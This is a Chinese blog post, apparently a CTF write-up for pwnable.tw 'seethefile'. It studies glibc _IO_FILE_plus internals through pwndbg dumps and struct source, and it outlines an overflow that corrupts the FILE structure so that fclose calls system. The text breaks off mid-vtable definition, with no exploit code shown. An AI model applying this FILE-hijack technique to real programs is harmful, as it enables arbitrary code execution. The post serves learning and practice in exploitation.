



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="writeup" />


<link rel="canonical" href="http://example.com/2022/03/19/pwnable-seethefile/">



  <title>
pwnable_seethefile - pwn |
dreamcat = 我他喵的</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">pwnable_seethefile
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-03-19 21:44:16">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-03-19T21:44:16+08:00">2022-03-19</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>17k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>16 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/pwnable-seethefile/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="dreamcat">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="我他喵的">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>这篇文章主要是在简单的记录小猫在学习 IO_FILE 时候遇到的一些问题。借用 pwnable.tw 题目 seethefile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *)0x804c410</span><br><span class="line">gdb调FILE_PLUS结构体，可以是地址，也可以是stdin等</span><br></pre></td></tr></table></figure>
<p>32 位程序：</p>
<ol>
<li>
<h3 id="question"><a class="markdownIt-Anchor" href="#question">#</a> question</h3>
<p>open 打开文件 fp，在未读取数据时候，plus_file 结构体中一部分数据是空的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">21</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539000</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时我们看到程序开始有一个很大的堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x804c000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">不知道这块区域的具体作用，可能是缓存区</span><br></pre></td></tr></table></figure>
<p>当我们通过 fp 读取数据后，会在对快中开启一个新的空间来储存内容。上述堆块会被更新，内容是我们读入文件名，而 plus_file 的 read 以及 write 部分的指针会指向新开辟的堆块中的数据区域</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">22</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72538984</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x804c000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x74730a32</span>, </span><br><span class="line">  bk = <span class="number">0x7478742e</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0xa</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c408</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">353</span>, </span><br><span class="line">  fd = <span class="number">0xfbad2498</span>, </span><br><span class="line">  bk = <span class="number">0x804c570</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804c570</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804c570</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c568</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">4105</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x61616161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xa6161</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><em><strong>Q1:_IO_read_ptr 等几个指针有神吗作用？</strong></em></p>
<p>分别对应什么函数功能？为什么修改后，fread 不起作用了</p>
<p><em><strong>Q2:IO_buf_end -_IO_buf_base = 0x1000 为什么偏移量是 0x1000</strong></em>，内容堆块大小为 0x1008</p>
</li>
<li>
<h3 id="分析__io_file_plusneide一些内容"><a class="markdownIt-Anchor" href="#分析__io_file_plusneide一些内容">#</a> 分析 ——__IO_FILE_plusneide 一些内容</h3>
<p>_flags FILE 结构体的一些状态；_markers 为指向 markers 结构体的指针变量，为一个单向链表结构，存放流的位置；_chain 变量为一个链表的指针，进程中创建的 FILE 结构体会通过这个变量连成一个单向链表；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*_IO_FILE结构体*/</span></span><br><span class="line"><span class="comment">/* libio/libio.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span>  //新版本下已经被删除</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">22</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72538984</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<h3 id="回归题目思路明确溢出修改fd的plus调用close时调用system"><a class="markdownIt-Anchor" href="#回归题目思路明确溢出修改fd的plus调用close时调用system">#</a> 回归题目，思路明确，溢出修改 fd 的 plus，调用 close 时调用 system，</h3>
<p>下面时 vtable 的一些内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span 